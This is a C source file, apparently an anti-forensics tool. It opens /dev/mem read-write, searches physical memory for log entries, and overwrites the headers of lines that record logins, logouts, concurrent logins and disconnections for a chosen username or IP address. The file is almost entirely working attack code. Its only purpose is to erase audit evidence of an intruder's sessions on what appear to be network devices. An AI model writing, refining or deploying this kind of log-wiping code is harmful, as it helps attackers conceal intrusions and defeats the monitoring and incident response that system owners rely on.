
#include "mem.h"




char * getLineHeader(char * data){
	while(*data -- != '\n');
	return data+2;	
}


//buffer overflow
char* PartialCompare(char * format,char * data){
	int formatLen = strlen(format);

	while( *data && *data != '\n' && *data != '\r'){
		char * ptr = data ++;
		
		int len = 0;
		
		for( len = 0;len < formatLen; ){
			
			if(format[len] == '%' && format[len + 1] == 'T'){
				len += 2;
				do{
					if(*ptr == '\n' ||*ptr == '\r' ||  *ptr == 0){
						return 0;
					}
					ptr ++;
				}while( *ptr && *ptr != '\n' && *ptr != '\r' && *ptr != ' ');
			}
			else if(format[len] == *ptr){
				len ++;
				ptr ++;
			}
			else{
				break;
			}
		}
		
		if(len == formatLen){
			return data;
		}else{
			
		}
	}
	
	return 0;
	
}


char * getLogHeader(char * data,char * begin)
{

	char month[16];
	
	char day[16];
	
	char hour[16];
	
	char minute[16];
	
	char second[16];
	
	char str[1024+1];
	
	int size = 0;
	
	while(1){
		if(data < begin)
		{
			
			break;
		}
		
		if(*data == '\n' || *data == 0){
			break;
		}
		
		int cnt = sscanf(data,"%3s %2s %2s:%2s:%2s %1024s",month,day,hour,minute,second,str);
		if(cnt == 6){
			if(strlen(month) == 3 && strlen(day) == 2 && strlen(hour) == 2&& strlen(minute) == 2&& strlen(second) == 2){
				return data;
			}
			else{
				//continue;
			}
		}
		
		data --;
		size ++;
		if(size >=0x1000){
			break;
		}
	}
		
	return 0;
}




int makeLoginTag(char format[SEARCH_ITEM_LIMIT][256],int count,char * tag,char str[SEARCH_ITEM_LIMIT][1024],int *strSize)
{
	pid_t mypid = getpid();
	char * szboundary = "this is my bundary";

	int total = 0;
	int i = 0;
	for( i = 0;i < count;i ++){
		int length = sprintf(str[i],format[i],tag);
		
		int len = strlen(str[i]);
		
		strSize[i] = len;
			
		memcpy(str[i] + strSize[i] + 1,&mypid,sizeof(pid_t));
		strcpy(str[i] + strSize[i] + 1 + sizeof(pid_t),szboundary);
		
		printf("str[%d]:%s\r\n",i,str[i]);
		
		total ++;
	}
	
	return total;
}

char * getLineEnder(char * data){
	while(*data ++ != '\n');
	return data-1;
}


char * makeTestStr(char * str){
#if 0				
		int num = 0;
		char c = 'z';
		for(num = 0;num < 13;num++){
			str[num] = c ;
			c -=2;
		}
#else
		//char * str = "zxvtrpnljhfdb";
		//char * searchstr = "Login successful for user";
		//char * searchstr = "Console logging";
		//strcpy(str,searchstr);
#endif
	return 0;
}


int DeleteAddr(char * ip){
	int ret = 0;
	char format[SEARCH_ITEM_LIMIT][256];
	int seq = 0;
	if(ip){
		seq = 0;
		strcpy(format[seq++],"-CONNECTION: Disconnected from %s\n");
		ret = deleteLog(format,seq,ip);
	}
	
	return 0;
}


int DeleteUser(char * username){
	
	int ret = 0;
	/*
	ret = deleteLog("-LOGOUT: Exec session is terminated for user %s on line ","admin");
	ret = deleteLog("-LOGIN_SUCCESS: Login successful for user %s on line ","admin");
	ret = deleteLog("-CONCURRENT_LOGIN: User %s has ","admin");
	if(ip){
		ret = deleteLog("-CONNECTION: Disconnected from %s\n",ip);
	}
	*/
	
	char format[SEARCH_ITEM_LIMIT][256];
	int seq = 0;
	strcpy(format[seq++],"-LOGOUT: Exec session is terminated for user %s on line ");
	strcpy(format[seq++],"-LOGIN_SUCCESS: Login successful for user %s on line ");
	strcpy(format[seq++],"-CONCURRENT_LOGIN: User %s has ");
	
	ret = deleteLog(format,seq,username);
	
	return ret;
}


int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char * tag) {
	int result = 0;
	
    int fd = 0;
	
	int bufsize = 0x1000000;

    char *data=malloc(bufsize+TERMINAL_BUF_SIZE);
	if(data <= 0){
		perror("malloc");
		return -1;
	}
    
    fd = open("/dev/mem", O_RDWR);
    if (fd <= 0) {
        perror("open");
		free(data);
        return -1;
    }
	
	unsigned int total = 0;
	
	char str[SEARCH_ITEM_LIMIT][1024];
	int strSize[SEARCH_ITEM_LIMIT];
	//makeTestStr(str);
	result = makeLoginTag(format,count,tag,str,strSize);
	
	int pagesize =  getpagesize();
	int pagemask = ~(pagesize - 1);
	
	pid_t mypid = getpid();
	char * szboundary = "this is my bundary";
    
	while(1){
		
		int rlen =  read(fd, data, bufsize);
		if(rlen <= 0 || rlen > bufsize ){
			perror("read\r\n");
			break;
		}
		
		if(rlen != bufsize ){
			printf("read actual size:%d\r\n",rlen);
		}
		memset(data + rlen,0,TERMINAL_BUF_SIZE);
		
		//int cmpsize = rlen - strSize;
		int idx = 0;
		int seq = 0;
		for(idx = 0;idx <= rlen-1;idx++){
			for(seq = 0;seq < count;seq ++){
				if(memcmp(data+idx,str[seq],strSize[seq])== 0 ){
					if(memcmp(data + idx + strSize[seq] + 1,&mypid,sizeof(pid_t)) == 0 && 
					strcmp(data + idx + strSize[seq] + 1 + sizeof(pid_t),szboundary) == 0 )
					{
						//printf("Find same process string at file offset:%x,value:%s\r\n",total + idx,data + idx);
					}
					else{
						int strOffset = (unsigned long)str[seq] % pagesize;
						if( (idx % pagesize) != strOffset )
						{
							char * lineHdr = getLogHeader(data + idx,data);
							if(lineHdr){
								printf("Find target string at file offset:%x,value:%s\r\n",lineHdr,lineHdr);
								
								unsigned int hdrOffset = (total + idx) & pagemask;
								
								unsigned int hdrAlignFileOffset = (total + (lineHdr - data)) & pagemask;
								
								int hdrPageOffset = (total + (lineHdr - data)) - hdrAlignFileOffset;
								
								void *mapaddr = mmap(NULL,pagesize, PROT_READ | PROT_WRITE,MAP_PRIVATE , fd, hdrAlignFileOffset);
								if(mapaddr == MAP_FAILED){
									perror("mmap\r\n");
									break;
								}
								else{								
									memcpy((char*)mapaddr+hdrPageOffset,"\x00\x00\x00\x00",4);
									//printf("new address:%x,new string:%s\r\n",mapaddr+hdrPageOffset, mapaddr+hdrPageOffset);
								}
								munmap(mapaddr, pagesize);
							}
							else{
								printf("Not find target string header at file offset:%x,value:%s\r\n",total + idx,data + idx);
							}
						}
						else{
							//printf("Find same page align string at file offset:%x,value:%s\r\n",total + idx,data + idx);
						}
					}
				}
			}
		}
		total += rlen;
		if(total >= 0xc0000000){
			break;
		}	
	}
    
    close(fd);
	
	free(data);
	
    return 0;
}







